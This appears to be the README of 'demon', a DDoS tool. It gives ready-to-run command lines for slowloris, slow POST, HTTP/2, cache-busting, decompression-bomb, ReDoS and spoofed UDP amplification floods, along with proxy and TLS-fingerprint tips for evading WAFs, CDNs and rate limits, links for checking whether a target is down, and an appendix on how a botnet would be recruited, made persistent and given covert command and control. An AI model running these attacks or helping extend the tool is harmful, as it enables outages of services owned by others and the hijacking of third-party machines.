`tagteam.sh` runs multiple processes on **one** machine. `fleet.sh` runs the binary across **multiple machines you control**, in lockstep, the legitimate answer to the single machine ceiling. It is not a botnet: it uses plain SSH to hosts you already have credentials for, with no infection, no persistence, and no callback C2. You are responsible for the same authorization on every host *and* on the target.

It cross compiles the binary, pushes it to each host, runs it with identical flags, prefixes each host's output, and on a single Ctrl+C stops every remote process cleanly.

```bash
# hosts file: one [user@]host[:ssh_port] per line (see fleet_hosts.example)
./fleet.sh hosts.txt https://example.com -attack 2 -concurrency 300 -rate 5000 -duration 5m
```

Requires key based SSH to every host (runs in BatchMode) and a local Go toolchain for the cross-compile (`FLEET_GOOS`/`FLEET_GOARCH` override the default `linux/amd64`).

---

## Demon variants

Theoretical ceilings for each attack path, tuned to the structural maximum of what the implementation actually supports. Most have host level preparation requirements that prevent them from running as written without setup. They are documented here as reference points and as a reminder that the hard hitting section is not the top, it is just the comfortable range.

---

### Demon Flood (Tsunami)
*Type 0 — every evasion layer simultaneously, rate high enough to stress the rate limiter itself*

The rate and concurrency math: at a 50ms average server response time, goroutines usefully in flight = rate x 0.05. At 50,000/s that is 2,500, so `-concurrency 2000` keeps every worker busy without spinning idle ones. The full bypass stack is on top: distributed timing makes the interrequest gaps look human, smart throttle backs off on 429s then ramps back up, adaptive rate shrinks the worker count under pressure and grows it when the target recovers. Every request gets a different UA, a different WAF bypass shape, and unique cache-bust params so no two requests share a fingerprint.

```bash
./demon -attack 0 -concurrency 2000 -rate 50000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -rotate-ua -waf-evade -randomize-headers -cache-bust \
  -bypass-ratelimits -distributed-timing -smart-throttle -adaptive-rate \
  -infinite <target>
```

> **Caveat:** 50k req/s at even 1KB average response size is 400Mbps of inbound traffic to your machine. Effective throughput is whatever your uplink allows, a residential connection saturates around 4–5k req/s regardless of what the rate limiter says.

---

### Demon Hold
*Type 1 — slowloris at the file descriptor ceiling*

The structural limit for simultaneous held connections is the OS fd table. Linux defaults to 1024 open files per process; after raising it, you can hold hundreds of thousands. At 10,000 concurrent workers each dripping one header every 10 seconds, the server's accept queue fills before your OS runs out. `-tls-fingerprint` is necessary here because a TLS inspecting proxy that sees Go's default ClientHello will close the handshake before the slowloris half request even begins.

```bash
ulimit -n 500000
./demon -attack 1 -concurrency 10000 -rate 5000 \
  -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -rotate-ua -randomize-headers -waf-evade \
  -infinite <target>
```

> **Caveat:** `ulimit -n 500000` must be run in the same shell session before launching. macOS caps at ~24,576 without SIP modifications. Linux accepts the raise freely as root. Your machine also holds these sockets, you need enough local RAM to buffer 10,000 open TLS connections simultaneously (~20–40MB depending on cipher suite).

---

### Demon Stream
*Type 2 — h2 multiplexer at maximum connection density per worker*

`-h2-connections 16` spreads each worker across 16 independent TCP sockets instead of the default 4. The server has to maintain 16 concurrent stream schedulers per worker, so killing one connection does not drain the attack — 15 remain. The theoretical ceiling is 500 workers x 16 connections x 100 streams = 800,000 logical concurrent streams. The server's h2 implementation has to arbitrate all of them while also handling the TLS overhead of 8,000 simultaneous connections.

```bash
./demon -attack 2 -concurrency 500 -rate 20000 \
  -http2 -h2-connections 16 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -rotate-ua -waf-evade -randomize-headers -cache-bust \
  -infinite <target>
```

> **Caveat:** servers enforce `MAX_CONCURRENT_STREAMS`, typically 100–250. Beyond that cap, streams queue on your side and the server sees only what it allows through. At that point more independent connections matter more than more streams per connection, which is exactly what `-h2-connections 16` provides.

---

### Demon Void
*Type 3 — CDN cache stripped to zero, every request a mandatory origin hit*

Cache busting at high rate forces the CDN to forward every single request to origin because every URL is unique. The CDN's whole job is to absorb traffic before it reaches your server, this removes that entirely. At 15,000 req/s against a CDN-protected target with no origin capacity reserve, the origin server sees traffic it has never had to handle before. `-tls-fingerprint` gets past the CDN's TLS layer so the cache-busting requests actually land instead of being blocked before HTTP parsing.

```bash
./demon -attack 3 -concurrency 400 -rate 15000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -rotate-ua -waf-evade -randomize-headers \
  -infinite <target>
```

> **Caveat:** this is only effective against targets where CDN offload is doing meaningful work. If the origin is already exposed or the CDN pass through rate is high, the delta from cache busting is small.

---

### Demon Probe
*Type 4 — API surface saturated across 50 concurrent sub requests per worker*

At 500 workers x 50 sub requests = 25,000 simultaneous API endpoint hits, every common path (`/api/v1/users`, `/graphql`, `/admin`, `/search`, etc.) is being hammered simultaneously with randomized methods and payload types. The interesting effect is not just volume but variety, XML bodies, deeply nested JSON, large strings, and null payloads all arrive on different endpoints at the same time, forcing the backend to exercise different code paths in parallel. Database connection pools, ORM caches, and middleware chains all take hits simultaneously.

```bash
./demon -attack 4 -concurrency 500 -rate 10000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -rotate-ua -waf-evade -randomize-headers -cache-bust \
  -infinite <target>
```

---

### Demon Ghost
*Type 5 — all six WAF bypass shapes in flight simultaneously, every request a different variant*

At 400 workers x 75 sub-requests = 30,000 simultaneous bypass shaped requests, every variant is always in flight. A WAF watching the traffic stream sees URL encoded paths, parameter polluted queries, content type mismatches, overloaded query strings, path traversal normalization, and JSON POST bodies all arriving concurrently from different proxy IPs with different TLS fingerprints. Writing a rule that catches all six shapes without also blocking legitimate traffic is the problem this creates, each shape needs its own rule.

Note: `-waf-evade` is deliberately omitted here. Type 5 already applies bypass shapes by definition and stacking the flag adds overhead without adding coverage variants.

```bash
./demon -attack 5 -concurrency 400 -rate 12000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -rotate-ua -randomize-headers -cache-bust \
  -infinite <target>
```

> **Caveat:** `-tls-fingerprint` is load bearing here. WAF bypass at the HTTP layer is pointless if the TLS fingerprint gets the connection blocked before HTTP is parsed. These two flags are a pair for any CDN protected target.

---

### Demon Anchor
*Type 6 — slow POST anchoring server threads at the maximum held connection depth*

Each held connection announces a 2GB `Content-Length` then trickles one byte every 5 seconds. The server opens a read buffer and ties up one thread waiting for a body that will take 317 years to arrive. At 5,000 workers with `-max-held-connections` raised, the server's thread pool exhausts long before the attacker runs out of goroutines. The key difference from slowloris is that this stalls *after* the headers are fully received, WAFs that only timeout partial header connections let it through.

```bash
ulimit -n 500000
./demon -attack 6 -concurrency 5000 -rate 10000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -waf-evade \
  -max-held-connections 500000 \
  -infinite <target>
```

> **Caveat:** same `ulimit -n` requirement as Demon Hold. Most servers cap thread pools at 200–1000, you hit the ceiling well before 5,000 goroutines are dispatched, which is the point. `-max-held-connections 500000` is the backstop on the attacker side; raise it to match whatever `-concurrency x duration` produces in held goroutines.

---

### Demon Bomb (Spirit bomb)
*Type 7 — decompression bomb at half a gigabyte per request*

`-bomb-size-mb 512` doubles the default. The wire payload grows proportionally (zeros compress ~1000:1, so ~512KB on the wire per request) but the server allocation per landing bomb is 512MB. At 25 subrequests per worker and 300 workers, the theoretical simultaneous allocation is 300 x 25 x 512MB = 3.75TB, the server kernel OOM kills processes long before that, but even 20 simultaneous landings is 10GB of pressure. The question is always whether the bomb gets past the edge, which is why `-tls-fingerprint` and WAF evasion are on.

```bash
./demon -attack 7 -concurrency 300 -rate 3000 \
  -bomb-size-mb 512 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -waf-evade -randomize-headers -cache-bust \
  -infinite <target>
```

> **Caveat:** 3,000 req/s x 512KB = ~1.5 GB/s outbound from your machine. Most pipes saturate before the concurrency becomes meaningful. A 10GbE VPS can push this; a residential connection caps around 100–150 req/s at 512KB payload size. Larger bombs are also more likely to be rejected at the edge as 413 before reaching the application layer, the landing rate dashboard metric tells you which regime you are in.

---

### Demon Drain
*Type 8 — connection exhaustion at the OS fd ceiling*

Silent connections are the simplest attack in the tool and also one of the hardest to defend against at scale. Complete TCP/TLS handshake, then nothing — the server holds an open accepted socket blocked on a read that never comes. At 5,000 workers with the fd limit raised, you can drain a server's fd table and socket buffer pool faster than it can time out dead connections on default TCP keepalive settings (Linux default: 2 hours before a keepalive probe fires).

```bash
ulimit -n 500000
./demon -attack 8 -concurrency 5000 -rate 15000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -waf-evade \
  -max-held-connections 500000 \
  -infinite <target>
```

> **Caveat:** a well tuned server with `tcp_keepalive_time=60` will detect and reap silent connections within a minute rather than two hours. The attack works best against default kernel TCP settings, which most servers run. If the server is hardened against this, switch to Demon Anchor, a 2GB Content-Length connection is harder to identify as malicious than a genuinely silent one.

---

### Demon Burn
*Type 9 — all four resource exhaustion payloads competing for the same CPU simultaneously*

At 600 workers x 30 sub requests = 18,000 simultaneous payloads cycling across XML entity expansion, deeply nested JSON (5,000 levels), ReDoS bait (8,000 `a` chars), and large form encoded bodies. The interesting effect is not that any one payload is catastrophic, it is that all four hit different subsystems at the same time. The recursive XML parser, the JSON descent allocator, the regex engine, and the form decoder are all competing for CPU cores simultaneously. Something usually trips first; the burn rate metric tells you which payload type is landing.

```bash
./demon -attack 9 -concurrency 600 -rate 10000 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -waf-evade -randomize-headers -cache-bust \
  -infinite <target>
```

---

### Demon Storm
*Type 10 - UDP amplification at elevated invocation ceiling, all five vectors simultaneously*

`-max-udp-floods 16` raises the cap from 8 to 16 concurrent invocations, doubling the goroutine count to ~2,400 across all vectors. Each invocation fires DNS, NTP, memcached, fragmented UDP, and, when a list is supplied — SSDP simultaneously. At this level the bottleneck is amplifier availability and your pipe capacity, not goroutines. NTP monlist at up to 556x amplification means even a modest pipe punches well above its weight. Add `-discover-amplifiers` to build a live amplifier list before the flood starts, or pass `-dns-amplifiers`/`-ntp-amplifiers`/`-memcached-amplifiers`/`-ssdp-amplifiers` with files from a Shodan export.

```bash
ulimit -u 100000
sudo ./demon -attack 10 -concurrency 500 -rate 20000 \
  -max-udp-floods 16 \
  -discover-amplifiers -discover-timeout 60 -discover-count 100 \
  -infinite <target>
```

> **Caveat:** 16 x 150 goroutines = 2,400 goroutines each pinning an OS thread for raw socket I/O. `ulimit -u 100000` must be set first or the Go runtime crashes with `failed to create new OS thread`. Requires a 10GbE+ uplink to push past what 8 invocations already saturate at full speed. Linux only — macOS falls back to `directUDPFlood` on the first invocation and `-max-udp-floods 16` just means 16 x direct flood goroutine pools instead of amplification.

---

### Demon Compound
*Types 7 + 9 + 8 simultaneously — decompression allocation + CPU exhaustion + fd table drain*

Three attack types from one worker pool, each hitting a different server subsystem. The compression bombs stress the decompression allocator and push memory. The resource exhaustion payloads burn CPU across the parser and regex stacks. The silent connections drain the fd table and socket buffer pool. All three happen simultaneously from the same process, and no single mitigation covers all three at once. `-bomb-size-mb 256` is used instead of 512 here because the mix means fewer bomb workers — lower per-bomb allocation, more consistent throughput across all three paths.

```bash
ulimit -n 500000
./demon -attack 7,9,8 -concurrency 600 -rate 8000 \
  -bomb-size-mb 256 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -waf-evade -randomize-headers -cache-bust \
  -max-held-connections 200000 \
  -infinite <target>
```

> **Caveat:** type 8 workers lock a connection for the full duration and never cycle back to types 7 or 9. Over a long run the pool drifts toward type 8 saturation as held goroutines accumulate. This is intentional — the held connections pile up while the cycling workers keep bombing and burning. If you want a pure mix without drift, run type 7+9 in one process and type 8 separately, each with their own rate budget.

---

### Demon Apocalypse
*Network layer + application layer simultaneously — UDP flood while HTTP subsystems saturate*

Two separate processes, each with its own rate budget and goroutine pool, hitting different layers of the stack at the same time. The UDP process saturates the network layer with spoofed amplification traffic from all five vectors. The HTTP process simultaneously exhausts the application layer across decompression allocation, parser CPU, and silent connection accumulation. The target is hit at the IP stack by reflection traffic it cannot easily source-filter, at the TCP layer by connection accumulation, and at the HTTP/application layer by memory and CPU pressure — all concurrently.

The reason this is two processes and not a single `-attack 10,7,9,8` tag team: UDP flood workers do not use proxies and run at the kernel level via raw sockets. Putting them in the same worker pool as HTTP workers means they share a rate budget, a semaphore, and a proxy pool — none of which make sense for raw socket I/O. Separate processes let each one run at its own pace unconstrained by the other.

```bash
ulimit -n 500000 && ulimit -u 100000

# terminal 1 network layer: UDP amplification, all five vectors
sudo ./demon -attack 10 -concurrency 300 -rate 10000 \
  -max-udp-floods 12 \
  -infinite <target>

# terminal 2 application layer: memory + cpu + connection table
./demon -attack 7,9,8 -concurrency 600 -rate 8000 \
  -bomb-size-mb 256 \
  -http2 -tls-fingerprint -keepalive-abuse \
  -rotate-proxy -waf-evade -randomize-headers -cache-bust \
  -max-held-connections 200000 \
  -infinite <target>
```

> **Caveat:** this is the highest impact configuration in this document. Running both simultaneously from a single machine requires at minimum a 10GbE uplink, root access, and a Linux host with tuned kernel parameters. On anything less, one of the two processes will be pipe-limited and the other will carry the actual load. Use `fleet.sh` to split them across two VPS hosts with separate NICs if the local pipe is the bottleneck.

---

## Proxy file format

    # residential SOCKS5, best evasion, defeats cdn ip reputation
    socks5://user:pass@gate.provider.com:7000

    # unauthenticated SOCKS5
    socks5://1.2.3.4:1080

    # authenticated HTTP CONNECT proxy
    http://user:pass@1.2.3.4:8080

    # plain HTTP proxy
    http://1.2.3.4:3128

    # bare host:port, treated as http://
    1.2.3.4:8080


Blank lines and lines starting with `#` are ignored.

---

## Config file

`demon_config.json` is created automatically on first run with default values, and read on every run after that. Pass `-config myconfig.json` to use a different file.

**Precedence (highest to lowest): command-line flag -> config file -> built-in default.** A flag you *pass* overrides the file for that run; a flag you *omit* falls back to the file's value. Settings that have no corresponding flag (e.g. `anonymity_required`, `bypass_settings`, `max_concurrency`) can only be changed in the file.

**Flags are transient, a run never writes them back to the file.** The config only changes when *you* edit it, or when it's regenerated. If you delete it, the next run recreates it from the built in defaults, identically every time, regardless of which command/flags you ran (the flags drive that run, not the saved file). Note that a regenerated file has `proxy_rotation: True`, since rotation is opt-in. In short: the config is a stable input you control, not something that absorbs whatever you last ran.

```json
{
  "attack_type": 2,
  "attack_types": [2, 7],
  "concurrent_workers": 300,
  "request_rate": 5000,
  "attack_duration": 0,
  "proxy_rotation": true,
  "proxy_file": "proxies.txt",
  "proxy_test_timeout": 5,
  "proxy_target_count": 50,
  "proxy_acquire_timeout_sec": 45,
  "proxy_refresh_interval_sec": 300,
  "user_agent_rotation": true,
  "header_randomization": true,
  "keep_alive_abuse": false,
  "http2": true,
  "http2_connections": 4,
  "bomb_size_mb": 64,
  "max_held_connections": 50000,
  "max_udp_floods": 8,
  "bandwidth": "",
  "adaptive_bandwidth": true,
  "cache_busting": true,
  "waf_evasion": false,
  "behavior_mimicry": false,
  "tls_fingerprinting": false,
  "rate_limit_bypass": false,
  "distributed_timing": false,
  "intelligent_throttle": false,
  "adaptive_rate_control": false
}
```

`attack_types` is the tag team pool used when `-attack` is not passed on the command line (an explicit `-attack` always wins). It's omitted from the file unless set; `attack_type` stays as the primary/first type for backward compatibility.

---

## Monitoring

Check whether the target is down during or after a run:

- https://www.isitdownrightnow.com/
- https://downdetector.com/

Safe test targets:

- https://httpbin.org/get
- https://httpbin.org/post

---

> ## Notes

> **Proxy type matters more than any other flag.** A datacenter IP from a scraped list will be blocked at the edge by Cloudflare and Akamai before your first request lands. Residential SOCKS5 proxies (Brightdata, Oxylabs, Smartproxy, Webshare) have real ISP assigned IPs that pass CDN IP reputation checks. If the target is behind a CDN and you do not have residential proxies, expect 403s regardless of what other flags you set.

> **`-tls-fingerprint` is required against TLS inspecting CDNs.** Cloudflare and Akamai identify Go's stdlib TLS ClientHello by JA3/JA4 fingerprint at the TLS layer. Without this flag the connection is blocked before HTTP parsing begins. With it, the handshake is indistinguishable from Chrome 133.

> **Connection hold attacks (types 1, 6, 8) do not show high req/s in the dashboard.** Each worker goroutine ties up one connection for minutes at a time rather than cycling through many requests per second. Effectiveness is measured in connections absorbed by the server, not throughput.

> **`-rate` and `-concurrency` interact.** Rate is the ceiling across all workers combined. If you set `-concurrency 500 -rate 500`, each worker averages 1 req/s and spends most of its time blocked on the rate limiter. Useful concurrency is roughly `rate x expected_response_time_in_seconds`. A target responding in 100ms can keep `rate x 0.1` workers actively in flight.

> **`-attack 10` may silently fall back to the unprivileged path on macOS.** macOS restricts `IPPROTO_RAW` more aggressively than Linux. Some macOS kernel builds reject raw socket creation even as root, returning `socket: operation not permitted`. When that happens, `reflectionUDPFlood` returns false immediately and `directUDPFlood` runs instead, no amplification, no spoofing, just volume from your real IP. On Linux (a VPS, bare metal, or Docker with `--cap-add NET_RAW`), raw sockets work correctly as root with no extra setup.

---

## Appendix: botnet path

_This section is purely exploratory... A "what might it actually take to build this out" thought exercise. None of it is implemented, none of it is being built, and the existing `Misc./botnet/` code is a proof of concept skeleton, not a foundation for anything real. The point is to be honest about what the gap between a single machine stress tool and a genuinely distributed attack system actually looks like, because that gap is much larger than it might seem from the outside._

### Current build

The tool currently runs entirely from one machine. All traffic originates from a single source IP (or from proxy IPs you supply). The `Misc./botnet/` folder has a proof of concept commander/drone architecture: a commander process listens on a TCP port, drone processes connect back to it, and the commander sends shell commands that the drone executes. The drone can invoke the demon binary locally. This is just a toy, it is a single hop cleartext TCP channel with no authentication, no persistence, no infection mechanism, and no meaningful operational security.

### What a real botnet path would need

A real distributed attack path has three separate hard problems: recruitment (getting the binary onto many machines), command and control (C2), and operational security. Each one is substantially harder than the attack logic itself.

**Recruitment**

The binary has to reach and persist on machines you do not own. Current approaches in practice are:

- Exploit kits targeting unpatched CVEs (browser, OS, IoT firmware) to get initial code execution
- Phishing payloads that drop and run the binary with user level privileges
- Credential stuffing against SSH/RDP/router admin panels with default creds — still the most common path for IoT botnets
- Supply chain insertion (compromising a package or update mechanism that gets pulled by many machines)

Getting initial execution is one step. But persistence is separate, the binary needs to survive reboots, AV scans, and user account changes. On Linux this means a systemd unit, cron job, or maybe LD_PRELOAD hook. On Windows it means registry run keys, scheduled tasks, or a service. Modern EDR products flag all of these patterns.

**Command and control**

The current PoC version uses raw TCP on a hardcoded IP. That is the worst possible C2 design, the IP gets burned the moment one drone is inspected, and the channel is visible to any IDS watching for outbound connections to unknown hosts on unusual ports.

Now what production botnets actually use:

- Domain generation algorithms (DGA): the drone and commander independently compute the same pseudo random domain name from a shared seed (usually the current date). The operator registers whichever domain the DGA produces for today. ISPs and threat intel vendors track DGA patterns and pre burn known algorithms. Mirai, Necurs, and GameOver Zeus all used DGA variants.
- Fast flux DNS: a single C2 domain has dozens of A records that rotate every 60–300 seconds, each pointing to a different compromised proxy host. The actual C2 server is behind those proxies. Taking down any individual proxy IP does not take down the channel.
- Peer-to-peer C2: drones would discover each other via a DHT (similar to BitTorrent). There is no single commander IP to burn. Storm and Waledac used this. Harder to take down, but would be harder to implement.
- Protocol camouflage: the C2 channel is wrapped inside something that looks legitimate like HTTPS to a CDN fronted domain, DNS over HTTPS queries, Twitter/Discord/Telegram DMs via legitimate API calls, or steganographic payloads in image files. The point is that the traffic is indistinguishable from normal user traffic to any network layer observer.

**Operational security**

Every drone that gets captured and imaged gives the investigator a copy of the binary, the C2 domain or IP, the communication protocol, and any embedded keys. A real operation uses:

- Binary polymorphism or server side packing so each drone has a different on disk hash
- Encrypted, authenticated C2 channels (mutual TLS or noise protocol) so captured traffic is not readable
- Dead man's switches that wipe the binary if the drone goes dark for too long
- Staging: the initial payload is a minimal loader that fetches the real binary from a secondary location, making it harder to get the full tool from a captured dropper

**What integrating this into the current build might eventually look like**

The change wouldn't be the attack logic, demon already handles the attack side. The change is in how work is distributed. Like instead of running `./demon -attack 2 -concurrency 500 ...` on one machine, a C2 server just pushes a config payload to N drones, each of which runs demon locally against the same target. The commander aggregates stats back.

1. A C2 server that accepts authenticated drone connections, maintains a live drone roster, and can push `AttackConfig`-equivalent JSON payloads to all drones simultaneously
2. Drone agent: a persistent process that connects out to the C2 (not the other way around, outbound connections are much harder to block at a firewall), receives configs, spawns demon as a subprocess or imports the attack functions directly as a library, and streams stats back
3. Binary delivery and update mechanism: the drone agent needs a way to receive a new demon binary or config without requiring the operator to have shell access
4. The C2 channel needs to be authenticated (so random people cannot hijack your drones) and encrypted (so the channel is not trivially readable by an ISP or SIEM watching the drone host)

The current `Misc./botnet/` code has the shape of items 1 and 2 but none of the authentication, encryption, persistence, or delivery mechanisms. It also shells out to `go run demon/demon.go` which requires Go to be installed on every drone and in practice you would cross compile a static binary and push that.

**Local proxy path stays as is**

None of the above should change the current single machine proxy path. The proxy pool, scraper, and SOCKS5 dialer are the right tool when you are running from one machine and want to distribute apparent source IPs across rented proxy infrastructure without needing to compromise any hosts. The botnet path adds genuine geographic and IP diversity at the cost of the recruitment and C2 problems above.

---

## Honest limitations and reality checks

This is a work in progress. A lot of things here are genuinely useful, well implemented and best effect, and a lot of things are also rougher than the documentation might make them sound. This section tries to be straight about where the gaps are.

**This tool will not beat Cloudflare.** It might get through the TLS layer with `-tls-fingerprint`. It will likely hit JS challenge pages, browser integrity checks, or behavioral scoring after that. Those checks require a real browser runtime to solve. There is no headless browser path in this tool. If the target is fully behind Cloudflare Pro or Enterprise with bot management enabled, you are going to see challenge responses. Residential proxies help because the IP has reputation, but the behavioral fingerprint of a stress tool is still detectable above the network layer.

**This is not a finished project.** There are known rough edges: the botnet folder is a toy, and the proxy scraper is brittle against source sites changing their layout (it isolates per source failures and flags sources that silently rot, but free proxy sources still come and go). Things work well enough to be useful but calling this production grade would be overselling it...

---

